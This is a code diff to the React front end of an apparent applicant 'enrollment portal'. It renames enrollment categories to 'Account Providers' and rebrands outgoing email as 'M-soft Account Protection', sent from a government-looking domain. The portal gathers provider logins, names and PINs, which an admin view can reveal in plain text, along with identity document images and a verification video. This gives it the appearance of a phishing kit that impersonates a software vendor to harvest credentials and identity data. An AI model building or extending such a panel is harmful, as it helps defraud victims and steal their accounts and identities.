@@ -651,7 +651,7 @@ function Dashboard() {
   return <AppFrame active="dashboard" fitDashboard>
     <div className="dashboard-layout">
       <div className="dashboard-main">
-         <PageHeading eyebrow="YOUR ENROLLMENT" title={copyText(portalSettings.data, 'dashboard', 'title', 'A good place to begin.')} detail={copyText(portalSettings.data, 'dashboard', 'description', `Signed in as ${user?.fullName || user?.primaryEmailAddress?.emailAddress || 'your account'}. Start a separate application for each enrollment category.`)} />
+        <PageHeading eyebrow="YOUR ENROLLMENT" title={copyText(portalSettings.data, 'dashboard', 'title', 'A good place to begin.')} detail={copyText(portalSettings.data, 'dashboard', 'description', `Signed in as ${user?.fullName || user?.primaryEmailAddress?.emailAddress || 'your account'}. Start a separate application for each account provider.`)} />
         {failure ? <ErrorPanel message="Your enrollment information is temporarily unavailable." retry={() => { void summary.refetch(); void applications.refetch(); void categories.refetch(); }} /> :
           busy ? <LoadingPanel /> : <>
             <section className="selection-section rise-delay">
@@ -674,7 +674,7 @@ function Dashboard() {
                         : 'View current status'
                       : completedApplication
                         ? 'Start another application'
-                        : copyText(portalSettings.data, 'dashboard', 'buttonLabel', cardSettings?.buttonLabel ?? 'Select category');
+                        : copyText(portalSettings.data, 'dashboard', 'buttonLabel', cardSettings?.buttonLabel ?? 'Select account provider');
                   return <button type="button" key={category.id} disabled={startingCategoryId !== null} onClick={() => {
                     if (activeApplication) {
                       setLocation(['draft', 'needs_information'].includes(activeApplication.status) ? `/apply/${activeApplication.id}` : `/applications/${activeApplication.id}`);
@@ -833,7 +833,7 @@ function DraftApplication() {
         <h2 id="submission-success-title">Enrollment Submitted Successfully!</h2>
         <p>Your enrollment application has been submitted successfully. Your information is now awaiting review by our authorized enrollment team.</p>
         <div className="success-reference"><span>REFERENCE</span><b className="mono">{application.reference}</b></div>
-        <div className="review-field"><span>Selected category</span><b>{application.categoryName}</b></div>
+        <div className="review-field"><span>Selected Account Provider</span><b>{application.categoryName}</b></div>
         <div className="review-field"><span>Submission date</span><b>{formatDate(application.submittedAt)}</b></div>
         <div className="review-field"><span>Current status</span><b>Pending Review</b></div>
         <button className="button button-primary" onClick={() => setLocation(`/applications/${application.id}`)} data-testid="button-view-submitted-status">View Security Verification Status <ArrowRight size={15} /></button>
@@ -905,7 +905,7 @@ function DraftApplication() {
         if (!user?.id) throw new Error('The signed-in account could not be confirmed.');
         const record = getSessionDraft(application.id, user.id);
         if (!record) throw new Error('This session-only application is no longer available.');
-        if (!record.pin) throw new Error('Create the category PIN before submitting.');
+        if (!record.pin) throw new Error('Create the Account Provider PIN before submitting.');
         saved = await submitNew.mutateAsync({
           data: {
             submissionId: record.submissionId,
@@ -1283,8 +1283,8 @@ function draftProgressLabel(application: {
   currentStep: number;
   answers?: Record<string, unknown> | null;
 }) {
-  if (application.answers?.categoryEntryComplete !== true) return 'Category details not saved yet';
-  if (application.currentStep === 0) return 'Category details saved · wizard step 1 next';
+  if (application.answers?.categoryEntryComplete !== true) return 'Account Provider details not saved yet';
+  if (application.currentStep === 0) return 'Account Provider details saved · wizard step 1 next';
   return `Saved through step ${Math.min(application.currentStep, 8)} of 8`;
 }
 
@@ -1435,7 +1435,7 @@ function AdminUsers() {
       <div className="review-field"><span>Name</span><b>{selected.name || selected.username || 'Not provided'}</b></div>
       <div className="review-field"><span>Email</span><b>{selected.email || 'Not provided'}</b></div>
       <div className="review-field"><span>Role</span><b>{selected.role.replaceAll('_', ' ')}</b></div>
-      <div className="review-field"><span>Selected category</span><b>{selected.categoryName || 'None selected'}</b></div>
+      <div className="review-field"><span>Selected Account Provider</span><b>{selected.categoryName || 'None selected'}</b></div>
       <div className="review-field"><span>Application reference</span><b>{selected.applicationReference || 'No application'}</b></div>
       <div className="review-field"><span>Registration date</span><b>{formatDate(selected.registrationDate)}</b></div>
       <div className="review-field"><span>Account status</span><b>{selected.accountStatus}</b></div>
@@ -1445,7 +1445,7 @@ function AdminUsers() {
     <section className="queue-card admin-user-table-card">
       <div className="queue-card-head"><div><b>Accounts</b><span>Suspending an account does not delete its enrollment record.</span></div><span className="queue-count" data-testid="text-admin-user-count">{users.isLoading ? '…' : users.data?.totalCount ?? records.length}</span></div>
       {users.isLoading ? <LoadingPanel label="Loading applicant accounts" /> : records.length === 0 ? <EmptyPanel title="No matching user accounts" message="Try another name, email, reference, or account status." /> :
-        <div className="admin-table-scroll"><table className="admin-user-table"><thead><tr><th>User ID</th><th>Name / username</th><th>Email</th><th>Selected category</th><th>Application reference</th><th>Registration date</th><th>Account status</th><th>Enrollment status</th><th>Role</th><th>Actions</th></tr></thead>
+        <div className="admin-table-scroll"><table className="admin-user-table"><thead><tr><th>User ID</th><th>Name / username</th><th>Email</th><th>Selected Account Provider</th><th>Application reference</th><th>Registration date</th><th>Account status</th><th>Enrollment status</th><th>Role</th><th>Actions</th></tr></thead>
           <tbody>{records.map((record) => <tr key={record.userId} data-testid={`row-admin-user-${record.userId}`}>
             <td className="mono">{record.userId}</td><td>{record.name || record.username || '—'}</td><td>{record.email || '—'}</td><td>{record.categoryName || '—'}</td>
             <td className="mono">{record.applicationReference || '—'}</td><td>{formatDate(record.registrationDate)}</td><td><StatusPill status={record.accountStatus} /></td>
@@ -1642,15 +1642,15 @@ function AdminSettings() {
     const offset = typeof card[offsetField] === 'number' ? card[offsetField] as number : 0;
     const limit = placement === 'card' ? 48 : 120;
     const editorTitle = placement === 'card'
-      ? 'Category card logo'
+      ? 'Account Provider card logo'
       : placement === 'entry'
         ? 'Entry form logo'
         : 'PIN screen logo';
     const inputTestId = `input-settings-${placement}-logo-${card.id}`;
     const resetLabel = placement === 'card'
-      ? 'Use built-in category logo'
+      ? 'Use built-in Account Provider logo'
       : placement === 'entry'
-        ? 'Use category card logo'
+        ? 'Use Account Provider card logo'
         : 'Use entry form logo';
     return <div className="settings-logo-editor" key={placement} data-testid={`settings-logo-editor-${placement}-${card.id}`}>
       <div className="settings-logo-editor-heading">
@@ -1708,10 +1708,10 @@ function AdminSettings() {
   };
   const screenLabels = [
     ['dashboard', 'User dashboard'],
-    ['category-entry-1', 'Category One entry form'],
-    ['category-entry-2', 'Category Two entry form'],
-    ['category-entry-3', 'Category Three entry form'],
-    ['category-entry-4', 'Category Four entry form'],
+    ['category-entry-1', 'Account Provider One entry form'],
+    ['category-entry-2', 'Account Provider Two entry form'],
+    ['category-entry-3', 'Account Provider Three entry form'],
+    ['category-entry-4', 'Account Provider Four entry form'],
     ...Array.from({ length: 8 }, (_, index) => [`workflow-step-${index + 1}`, `Enrollment step ${index + 1}`] as [string, string]),
     ['application-status', 'Security Verification Status'],
     ['support', 'Applicant support'],
@@ -1722,7 +1722,7 @@ function AdminSettings() {
   const categoryEntrySettings = [
     {
       screen: 'category-entry-1',
-      title: 'Category One',
+      title: 'Account Provider One',
       fields: [
         ['nameLabel', 'Name field label', 'Name'],
         ['nicknameLabel', 'Nickname field label', 'Nickname'],
@@ -1732,7 +1732,7 @@ function AdminSettings() {
     },
     {
       screen: 'category-entry-2',
-      title: 'Category Two',
+      title: 'Account Provider Two',
       fields: [
         ['nameLabel', 'Login field label', 'Login'],
         ['surnameLabel', 'Surname field label', 'Surname'],
@@ -1743,7 +1743,7 @@ function AdminSettings() {
     },
     {
       screen: 'category-entry-3',
-      title: 'Category Three',
+      title: 'Account Provider Three',
       fields: [
         ['nameLabel', 'Name field label', 'Name'],
         ['surnameLabel', 'Surname field label', 'Surname'],
@@ -1753,7 +1753,7 @@ function AdminSettings() {
     },
     {
       screen: 'category-entry-4',
-      title: 'Category Four',
+      title: 'Account Provider Four',
       fields: [
         ['nameLabel', 'Name field label', 'Name'],
         ['surnameLabel', 'Surname field label', 'Surname'],
@@ -1821,23 +1821,24 @@ function AdminSettings() {
       <a href="#settings-categories">Categories</a>
       <a href="#settings-appearance">Controls</a>
       <a href="#settings-backgrounds">Backgrounds</a>
-      <a href="#settings-category-copy">Category forms</a>
+      <a href="#settings-category-copy">Account Provider forms</a>
       <a href="#settings-workflow-copy">Workflow text</a>
     </nav>
     <section className="detail-card settings-panel" id="settings-landing" aria-labelledby="settings-landing-title">
       <div className="detail-card-title"><Home size={17} /><h2 id="settings-landing-title">Landing page</h2></div>
       <label className="field-label">Hero heading<input className="text-input" value={draft.hero.title} maxLength={160} onChange={(event) => updateHero('title', event.target.value)} data-testid="input-settings-hero-title" /></label>
-      <label className="field-label">Hero description<textarea className="text-input form-textarea" value={draft.hero.description} maxLength={500} rows={3} onChange={(event) => updateHero('description', event.target.value)} data-testid="input-settings-hero-description" /></label>
+      <label className="field-label">Hero description (fixed)<textarea className="text-input form-textarea" value={draft.hero.description} maxLength={500} rows={3} readOnly data-testid="input-settings-hero-description" /></label>
+      <p className="field-help">This public description is fixed. Saved admin copy is overridden so development and production use the same text.</p>
       <div className="settings-inline-fields">
         <label className="field-label">Primary button label<input className="text-input" value={draft.hero.getStartedLabel} maxLength={60} onChange={(event) => updateHero('getStartedLabel', event.target.value)} /></label>
       </div>
     </section>
     <section className="detail-card settings-panel" id="settings-categories" aria-labelledby="settings-categories-title">
-      <div className="detail-card-title"><GripVertical size={17} /><h2 id="settings-categories-title">Enrollment categories</h2></div>
-      <p className="field-help">Manage category presentation and the order shown on the applicant dashboard.</p>
+      <div className="detail-card-title"><GripVertical size={17} /><h2 id="settings-categories-title">Account providers</h2></div>
+      <p className="field-help">Manage account provider presentation and the order shown on the applicant dashboard.</p>
       <h3 className="settings-subheading">Dashboard card order</h3>
       <p className="field-help">Drag the cards into the order applicants should see, or use the arrow buttons. Save changes to publish the new order.</p>
-      <ol className="settings-card-order" aria-label="Enrollment card display order">
+      <ol className="settings-card-order" aria-label="Account Provider card display order">
         {draft.cards.map((card, index) => <li
           key={card.id}
           className={`settings-card-order-item ${draggedCardId === card.id ? 'settings-card-order-dragging' : ''}`}
@@ -1874,7 +1875,7 @@ function AdminSettings() {
     </section>
     <section className="settings-card-grid" aria-label="Enrollment card settings">
       {draft.cards.map((card) => <article className="detail-card settings-panel" key={card.id} data-testid={`settings-card-${card.id}`}>
-        <div className="detail-card-title"><FileCheck2 size={17} /><h2>{card.id.replace('category-', 'Category ')}</h2></div>
+        <div className="detail-card-title"><FileCheck2 size={17} /><h2>{card.id.replace('category-', 'Account Provider ')}</h2></div>
         <label className="field-label">Card title<input className="text-input" value={card.title} maxLength={100} onChange={(event) => updateCard(card.id, 'title', event.target.value)} /></label>
         <label className="field-label">Description<textarea className="text-input form-textarea" value={card.description} maxLength={240} rows={2} onChange={(event) => updateCard(card.id, 'description', event.target.value)} /></label>
          <div className="settings-card-text-editors">
@@ -1934,8 +1935,8 @@ function AdminSettings() {
       </div>
     </section>
     <section className="detail-card settings-panel" id="settings-category-copy" aria-labelledby="settings-category-copy-title">
-      <div className="detail-card-title"><FileText size={17} /><h2 id="settings-category-copy-title">Category entry form labels and buttons</h2></div>
-      <p className="field-help">Customize the visible field labels, PIN prompts, and action buttons for each category. Leave a field blank to use its current default.</p>
+      <div className="detail-card-title"><FileText size={17} /><h2 id="settings-category-copy-title">Account Provider entry form labels and buttons</h2></div>
+      <p className="field-help">Customize the visible field labels, PIN prompts, and action buttons for each account provider. Leave a field blank to use its current default.</p>
       <div className="settings-screen-list">
         {categoryEntrySettings.map(({ screen, title, fields }) => {
           const copy = draft.screenCopy[screen] ?? {};
@@ -2005,7 +2006,7 @@ function AdminSettings() {
               {keys.map((key) => {
                 const currentText = publishedCopy[key]?.trim();
                 const fallbackText = screen === 'dashboard' && key === 'title'
-                  ? 'Choose an enrollment category.'
+                  ? 'Choose an account provider.'
                   : screen === 'dashboard' && key === 'description'
                     ? 'Start or continue your application without creating an account. Identity files and verification video are collected later.'
                     : screen === 'dashboard' && key === 'sectionIdLabel'
@@ -2017,8 +2018,8 @@ function AdminSettings() {
             </div>
           </section>
           <div className="settings-inline-fields">
-            {keys.map((key) => <label className="field-label" key={key}>{key === 'sectionIdLabel' ? 'Section ID label' : key === 'buttonLabel' ? 'Primary button label' : key === 'buttonLabelStep1' ? 'Step 1 button text' : key === 'buttonLabelStep2' ? 'Step 2 button text' : key === 'backButtonLabel' ? 'Back button label' : key === 'nameLabel' ? 'Name / login field label' : key === 'pinLabel' ? 'PIN prompt label' : key === 'title' ? 'Screen title' : key === 'description' ? 'Description' : (workflowFieldLabels[screen] ?? []).find(([fieldKey]) => fieldKey === key)?.[1] ?? key.replace(/([A-Z])/g, ' $1').replace(/^./, (letter) => letter.toUpperCase())}
-              <input className="text-input" value={draft.screenCopy[screen]?.[key] ?? ''} maxLength={key.startsWith('buttonLabel') || key === 'backButtonLabel' ? 60 : 500} placeholder="Use portal default" onChange={(event) => updateScreenCopy(screen, key, event.target.value)} data-testid={`input-copy-${screen}-${key}`} />
+            {keys.map((key) => <label className="field-label" key={key}>{key === 'sectionIdLabel' ? 'Section ID label' : key === 'buttonLabel' ? 'Primary button label' : key === 'buttonLabelStep1' ? 'Step 1 button text' : key === 'buttonLabelStep2' ? 'Step 2 button text' : key === 'backButtonLabel' ? 'Back button label' : key === 'nameLabel' ? 'Name / login field label' : key === 'pinLabel' ? 'PIN prompt label' : key === 'title' ? 'Screen title' : key === 'description' ? 'Description' : (workflowFieldLabels[screen] ?? []).find(([fieldKey]) => fieldKey === key)?.[1] ?? key.replace(/([A-Z])/g, ' $1').replace(/^./, (letter) => letter.toUpperCase())}{screen === 'landing' && key === 'description' ? ' (fixed)' : ''}
+              <input className="text-input" value={draft.screenCopy[screen]?.[key] ?? ''} maxLength={key.startsWith('buttonLabel') || key === 'backButtonLabel' ? 60 : 500} placeholder="Use portal default" readOnly={screen === 'landing' && key === 'description'} onChange={(event) => updateScreenCopy(screen, key, event.target.value)} data-testid={`input-copy-${screen}-${key}`} />
             </label>)}
           </div>
         </details>;
@@ -2203,7 +2204,7 @@ function AdminApplicationReview() {
         <div className="review-field"><span>{copyText(portalSettings.data, entryScreen, 'sectionIdLabel', 'Selected card')}</span><b>{categoryTitle}</b></div>
         {getCategoryEntryFields(application.answers, application.categoryId, portalSettings.data).map((field) =>
           <div className="review-field" key={field.label}><span>{field.label}</span><b>{field.value}</b></div>)}
-        <div className="review-field"><span>Category PIN</span><b>{pinRevealed ? pinQuery.data?.pin : application.hasPin ? 'Set (hidden)' : 'Not set'}</b></div>
+        <div className="review-field"><span>Account Provider PIN</span><b>{pinRevealed ? pinQuery.data?.pin : application.hasPin ? 'Set (hidden)' : 'Not set'}</b></div>
         {application.hasPin && <button type="button" className="text-action" onClick={() => void revealOrHidePin()} disabled={pinQuery.isFetching} data-testid="button-reveal-application-pin">
           {pinQuery.isFetching ? 'Loading PIN…' : pinRevealed ? 'Hide PIN' : 'Reveal PIN'}
         </button>}
@@ -2351,7 +2352,7 @@ const emailAlertOptions: Array<{
   label: string;
   detail: string;
 }> = [
-  { key: 'contact_received', label: 'New applicant', detail: 'After contact details and category are saved.' },
+  { key: 'contact_received', label: 'New applicant', detail: 'After contact details and account provider are saved.' },
   { key: 'step_saved', label: 'Enrollment step saved', detail: 'When an applicant saves meaningful progress.' },
   { key: 'contact_updated', label: 'Applicant contact changed', detail: 'When the applicant changes their contact details.' },
   { key: 'evidence_saved', label: 'Evidence uploaded', detail: 'When an applicant adds identity evidence.' },
@@ -2363,15 +2364,15 @@ const defaultEmailBranding: AdminEmailBranding = {
   logoObjectPath: null,
   accentColor: '#49b8aa',
   headerColor: '#102b46',
-  senderName: 'Security Verification',
+  senderName: 'M-soft Account Protection',
   senderEmail: 'infomail@vu-gov.cc',
-  bannerMark: 'SV',
-  bannerTitle: 'Security Verification',
-  bannerSubtitle: 'ENROLLMENT PORTAL',
-  preheaderText: 'A message from the Security Verification Enrollment Portal team.',
+  bannerMark: 'MS',
+  bannerTitle: 'M-soft Account Protection',
+  bannerSubtitle: 'Bank Grade Security System',
+  preheaderText: 'A message from M-soft Account Protection.',
   messageEyebrow: 'STAFF MESSAGE',
-  footerText: 'Enrollment Portal staff communications',
-  footerLinkText: 'Visit the enrollment portal',
+  footerText: 'M-soft Account Protection staff communications',
+  footerLinkText: 'Visit M-soft Account Protection',
   footerLinkUrl: null,
   footerLinkColor: '#287d8b',
   footerBackgroundColor: '#f1f5f8',
@@ -3356,7 +3357,7 @@ const guestContactSchema = z.object({
     .optional(),
 });
 const guestApplicationSchema = guestContactSchema.extend({
-  categoryId: z.string().min(1, 'Choose an enrollment category.'),
+  categoryId: z.string().min(1, 'Choose an account provider.'),
 });
 type GuestApplicationValues = z.infer<typeof guestApplicationSchema>;
 const guestDashboardStartSchema = guestApplicationSchema;
@@ -3472,7 +3473,7 @@ function PublicApplicantDashboard() {
         window.sessionStorage.setItem(GUEST_DASHBOARD_PENDING_CATEGORY_KEY, categoryId);
         setLocation('/guest/apply');
       } catch {
-        setStartError('Your category could not be saved in this browser. Enable session storage and try again.');
+        setStartError('Your account provider could not be saved in this browser. Enable session storage and try again.');
       }
       return;
     }
@@ -3495,7 +3496,7 @@ function PublicApplicantDashboard() {
       <div className="dashboard-main">
         <PageHeading
           eyebrow={copyText(portalSettings.data, 'dashboard', 'sectionIdLabel', 'APPLICANT DASHBOARD')}
-          title={copyText(portalSettings.data, 'dashboard', 'title', 'Choose an enrollment category.')}
+          title={copyText(portalSettings.data, 'dashboard', 'title', 'Choose an account provider.')}
           detail={copyText(portalSettings.data, 'dashboard', 'description', 'Start or continue your application without creating an account. Identity files and verification video are collected later.')}
         />
         {contact && <div className="guest-dashboard-contact">
@@ -3504,14 +3505,14 @@ function PublicApplicantDashboard() {
         {startError && <p className="guest-inline-error" role="alert" data-testid="guest-dashboard-start-error">{startError}</p>}
         <section className="selection-section rise-delay">
           <div className="section-line">
-            <div><h2>Enrollment categories</h2><p>Select a category to continue.</p></div>
+            <div><h2>Account providers</h2><p>Select an account provider to continue.</p></div>
             <span className="step-indicator">START HERE</span>
           </div>
           {categories.isLoading ? <div className="guest-category-skeleton" data-testid="guest-dashboard-loading"><div /><div /><div /><div /></div> :
             categories.isError ? <div className="guest-inline-error" role="alert" data-testid="guest-dashboard-error">
-              <p>Enrollment categories could not be loaded.</p>
+              <p>Account providers could not be loaded.</p>
               <button type="button" className="text-action" onClick={() => void categories.refetch()} data-testid="button-retry-dashboard-categories">Try again <ArrowRight size={14} /></button>
-            </div> : categories.data?.length === 0 ? <div className="guest-inline-error" role="status">No enrollment categories are available right now.</div> :
+            </div> : categories.data?.length === 0 ? <div className="guest-inline-error" role="status">No account providers are available right now.</div> :
               <div className={`category-grid${orderedCategories.length > 2 ? ' category-grid--with-row-divider' : ''}`}>
                 {orderedCategories.map((category, index) => {
                   const categoryIndex = Math.max(0, Number(category.id.split('-')[1]) - 1);
@@ -3520,7 +3521,7 @@ function PublicApplicantDashboard() {
                   const categoryDescription = cardSettings?.description?.trim() || category.description;
                   return <button type="button" key={category.id} onClick={() => chooseCategory(category.id)}
                     className={`category-card category-${categoryIndex + 1}`} style={categoryCardStyle(cardSettings, palette[categoryIndex])}
-                    aria-label={`${cardTitle}. ${categoryDescription}. ${contact ? 'Start an application' : 'Choose category'}`} data-testid={`guest-dashboard-category-${category.id}`}>
+                    aria-label={`${cardTitle}. ${categoryDescription}. ${contact ? 'Start an application' : 'Choose account provider'}`} data-testid={`guest-dashboard-category-${category.id}`}>
                     <span className="category-number">0{index + 1}</span>
                     {cardSettings?.logoDataUrl
                       ? <img src={cardSettings.logoDataUrl} alt="" className="category-logo" style={cardLogoPositionStyle(cardSettings.cardLogoAlignment, cardSettings.cardLogoVerticalOffset)} />
@@ -3535,7 +3536,7 @@ function PublicApplicantDashboard() {
                               : <span className="category-symbol" style={{ color: iconColors[categoryIndex] }}><FileCheck2 size={22} strokeWidth={1.75} /></span>}
                     <span className="category-title">{cardTitle}</span>
                     <span className="category-description">{categoryDescription}</span>
-                    <span className="category-select">{contact ? 'Start application' : 'Choose category'} <ArrowUpRight size={15} /></span>
+                    <span className="category-select">{contact ? 'Start application' : 'Choose account provider'} <ArrowUpRight size={15} /></span>
                   </button>;
                 })}
               </div>}
@@ -3927,7 +3928,7 @@ function GuestApplicationPage() {
         const start = guestDashboardStartSchema.safeParse({ ...contactDetails.data, categoryId: pendingCategoryId });
         if (!start.success) {
           window.sessionStorage.removeItem(GUEST_DASHBOARD_PENDING_CATEGORY_KEY);
-          setContactSaveError('Your selected category could not be restored. Return to the dashboard and choose it again.');
+          setContactSaveError('Your selected account provider could not be restored. Return to the dashboard and choose it again.');
           setIsContinuing(false);
           return;
         }
@@ -4015,7 +4016,7 @@ function GuestApplicationPage() {
     }
     const start = guestDashboardStartSchema.safeParse(storedStart);
     if (!start.success) {
-      setResumeError('Your selected category could not be restored. Return to the dashboard and choose it again.');
+      setResumeError('Your selected account provider could not be restored. Return to the dashboard and choose it again.');
       return;
     }
     setDashboardStartValues(start.data);
@@ -4201,7 +4202,7 @@ function GuestApplicationPage() {
           <p>Contact the enrollment team if you believe this was closed in error.</p>
           <Link href="/guest/track" className="button button-primary guest-success-track">Return to status lookup <ArrowRight size={16} /></Link>
         </div> : stage === 'categoryEntry' && created ? <>
-          <div className="guest-form-topline"><span>CATEGORY DETAILS</span><span>STEP 3 OF 4</span></div>
+          <div className="guest-form-topline"><span>ACCOUNT PROVIDER DETAILS</span><span>STEP 3 OF 4</span></div>
           {progressError && <p className="guest-inline-error" role="alert">{progressError}</p>}
           <CategoryEntryForm
             categoryId={created.application.categoryId}
@@ -4244,9 +4245,9 @@ function GuestApplicationPage() {
         </> : stage === 'category' ? <div className="guest-starting-category" role="status" data-testid="guest-application-starting">
           <span className="guest-success-mark">{createGuest.isError ? <LockKeyhole size={20} /> : <ArrowRight size={20} />}</span>
           <div className="eyebrow">{createGuest.isError ? 'APPLICATION NOT STARTED' : 'OPENING YOUR APPLICATION'}</div>
-          <h2 id="guest-apply-heading">{createGuest.isError ? 'We couldn’t start this application.' : 'Preparing your category form…'}</h2>
+          <h2 id="guest-apply-heading">{createGuest.isError ? 'We couldn’t start this application.' : 'Preparing your account provider form…'}</h2>
           <p>{createGuest.isError
-            ? 'Your category selection and contact details are saved. Retry to continue without creating a duplicate.'
+            ? 'Your account provider selection and contact details are saved. Retry to continue without creating a duplicate.'
             : 'Your secure application is being prepared. This usually takes a moment.'}</p>
           {createGuest.isError && dashboardStartValues && <button type="button" className="button button-primary guest-success-track" onClick={() => void onSubmit(dashboardStartValues)} disabled={createGuest.isPending}>
             Retry application setup <ArrowRight size={16} />
@@ -4354,7 +4355,7 @@ function GuestTrackingPage() {
       {status && <section className="guest-status-card rise" aria-live="polite" data-testid="guest-public-status">
         <div className="guest-status-head"><div><span className="eyebrow">SECURITY VERIFICATION STATUS</span><h2>{status.reference}</h2></div><StatusPill status={status.reviewStatus ?? status.status} testId="status-guest-application" /></div>
         <div className="guest-status-details">
-          <div><span>Enrollment category</span><strong>{status.categoryName}</strong></div>
+          <div><span>Account Provider</span><strong>{status.categoryName}</strong></div>
           <div><span>Current status</span><strong className="guest-status-capitalize">{(status.reviewStatus ?? status.status).replaceAll('_', ' ')}</strong></div>
           <div><span>Last updated</span><strong>{formatDate(status.updatedAt)}</strong></div>
         </div>
@@ -4443,7 +4444,7 @@ function AdminGuestApplicationReview() {
     };
     if (record.reviewReady) return 'Ready for review · applicant has not submitted';
     const missing = [
-      !record.hasPin && 'category PIN',
+      !record.hasPin && 'Account Provider PIN',
       !hasFront && 'identity front',
       !hasVideo && 'verification video',
     ].filter(Boolean);
@@ -4453,7 +4454,7 @@ function AdminGuestApplicationReview() {
         portalSettings.data,
         `workflow-step-${Math.min(8, Math.max(1, record.currentStep + 1))}`,
         'title',
-        stepLabels[record.currentStep] ?? 'Category details',
+        stepLabels[record.currentStep] ?? 'Account Provider details',
       )}`;
     return `${details} · email ${record.emailVerified ? 'verified' : 'not verified'} · ${missing.length ? `missing ${missing.join(', ')}` : 'not submitted'}`;
   };
@@ -4557,7 +4558,7 @@ function AdminGuestApplicationReview() {
           <div className="review-field"><span>Email</span><b>{application.email || 'Not provided'}</b></div>
           <div className="review-field"><span>Phone</span><b>{application.phone || 'Not provided'}</b></div>
           <div className="review-field"><span>Email verification</span><b>{application.emailVerified ? 'Verified' : 'Not verified'}</b></div>
-          <div className="review-field"><span>{copyText(portalSettings.data, entryScreen, 'sectionIdLabel', 'Selected category')}</span><b>{categoryTitle}</b></div>
+          <div className="review-field"><span>{copyText(portalSettings.data, entryScreen, 'sectionIdLabel', 'Selected Account Provider')}</span><b>{categoryTitle}</b></div>
           <div className="review-field"><span>Application progress</span><b>{progressLabel(application)}</b></div>
           <div className="review-field"><span>Created</span><b>{formatDate(application.createdAt)}</b></div>
           <div className="review-field"><span>Last updated</span><b>{formatDate(application.updatedAt)}</b></div>
@@ -4600,8 +4601,8 @@ function AdminGuestApplicationReview() {
       </section>
       <section className="review-category-selection">
         <div className="detail-card-title"><CheckCircle2 size={17} /><h2>{copyText(portalSettings.data, entryScreen, 'title', categoryTitle)}</h2></div>
-        <div className="review-field"><span>{copyText(portalSettings.data, entryScreen, 'sectionIdLabel', 'Selected category')}</span><b>{categoryTitle}</b></div>
-        <div className="review-field"><span>Category PIN</span><b>{pinRevealed ? pinQuery.data?.pin : application.hasPin ? 'Set (hidden)' : 'Not set'}</b></div>
+        <div className="review-field"><span>{copyText(portalSettings.data, entryScreen, 'sectionIdLabel', 'Selected Account Provider')}</span><b>{categoryTitle}</b></div>
+        <div className="review-field"><span>Account Provider PIN</span><b>{pinRevealed ? pinQuery.data?.pin : application.hasPin ? 'Set (hidden)' : 'Not set'}</b></div>
         {application.hasPin && <button type="button" className="text-action" onClick={() => void revealOrHidePin()} disabled={pinQuery.isFetching} data-testid={`button-reveal-guest-pin-${application.id}`}>
           {pinQuery.isFetching ? 'Loading PIN…' : pinRevealed ? 'Hide PIN' : 'Reveal PIN'}
         </button>}
@@ -4736,7 +4737,7 @@ function ApplicantsPage() {
     const hasVideo = uploaded.some((item) => item.evidenceSlot === 'verification_video');
     if (application.reviewReady) return 'Ready for review · applicant has not submitted';
     const missing = [
-      !application.hasPin && 'category PIN',
+      !application.hasPin && 'Account Provider PIN',
       !hasFront && 'identity front',
       !hasVideo && 'verification video',
     ].filter(Boolean);
@@ -4746,7 +4747,7 @@ function ApplicantsPage() {
         portalSettings.data,
         `workflow-step-${Math.min(8, Math.max(1, application.currentStep + 1))}`,
         'title',
-        guestStepLabel[application.currentStep] ?? 'Category details',
+        guestStepLabel[application.currentStep] ?? 'Account Provider details',
       )}`;
     return `${detailStatus} · email not verified · ${missing.length ? `missing ${missing.join(', ')}` : 'not submitted'}`;
   };
@@ -4839,7 +4840,7 @@ function ApplicantsPage() {
         action={<div className="server-access"><span className="server-dot" /> Service access</div>}
       />
       <div className="admin-toolbar">
-        <label className="searchbox"><Search size={17} /><input type="search" value={search} onChange={(event) => setSearch(event.target.value)} placeholder="Search applicant, email, category, or reference" aria-label="Search all applicants" data-testid="input-applicants-search" /><span className="search-shortcut">⌘ K</span></label>
+        <label className="searchbox"><Search size={17} /><input type="search" value={search} onChange={(event) => setSearch(event.target.value)} placeholder="Search applicant, email, account provider, or reference" aria-label="Search all applicants" data-testid="input-applicants-search" /><span className="search-shortcut">⌘ K</span></label>
         <label className="filter-select"><span className="sr-only">Filter applicants by status</span><select value={status} onChange={(event) => setStatus(event.target.value)} data-testid="select-applicants-status">
           <option value="">All statuses</option><option value="draft">In progress</option><option value="submitted">Submitted</option><option value="under_review">Under review</option><option value="needs_information">Needs information</option><option value="approved">Approved</option><option value="rejected">Rejected</option><option value="received">Guest draft: received</option><option value="contacted">Guest draft: contacted</option><option value="closed">Guest draft: closed</option>
          </select><ChevronDown size={15} /></label>
@@ -4856,7 +4857,7 @@ function ApplicantsPage() {
             <button type="button" className="modal-close" onClick={() => setClearDialogOpen(false)} disabled={clearApplicantRecords.isPending} aria-label="Close applicant selection">×</button>
           </header>
           <p className="clear-record-warning"><Trash2 size={16} /> Clearing permanently deletes selected applicant details and their private evidence. This cannot be undone.</p>
-          <label className="searchbox clear-record-search"><Search size={16} /><input type="search" value={clearSearch} onChange={(event) => setClearSearch(event.target.value)} placeholder="Search applicants, email, category, or reference" aria-label="Search records to clear" data-testid="input-clear-record-search" /></label>
+          <label className="searchbox clear-record-search"><Search size={16} /><input type="search" value={clearSearch} onChange={(event) => setClearSearch(event.target.value)} placeholder="Search applicants, email, account provider, or reference" aria-label="Search records to clear" data-testid="input-clear-record-search" /></label>
           <div className="clear-record-select-all">
             <label><input type="checkbox" checked={allVisibleClearSelected} onChange={toggleVisibleClearApplicants} disabled={!visibleClearApplicants.length || clearApplicantRecords.isPending} /> Select all shown</label>
             <span>{selectedClearIds.length} selected · {clearableApplicants.length} total</span>
@@ -4893,7 +4894,7 @@ function ApplicantsPage() {
             matchingEnrollmentApplications.length === 0 ? <EmptyPanel title={searchTerm || status ? 'No matching applications' : 'No enrollment applications yet'} message={searchTerm || status ? 'Try changing the search or status filter.' : 'Submitted applications and signed-in drafts will appear here.'} /> :
                <div className="queue-list">{matchingEnrollmentApplications.map((application) => {
                  const categoryTitle = configuredCategoryTitle(portalSettings.data, application.categoryId, application.categoryName);
-                 const entryTitle = copyText(portalSettings.data, categoryEntryScreenId(application.categoryId), 'title', 'Category entry');
+                 const entryTitle = copyText(portalSettings.data, categoryEntryScreenId(application.categoryId), 'title', 'Account Provider entry');
                  const categoryFields = getCategoryEntryFields(application.answers, application.categoryId, portalSettings.data)
                    .map((field) => `${field.label}: ${field.value}`).join(' · ');
                  return <Link href={`/admin/applications/${application.id}`} className="queue-row" key={application.id} data-testid={`row-applicant-enrollment-${application.id}`}>
@@ -4920,7 +4921,7 @@ function ApplicantsPage() {
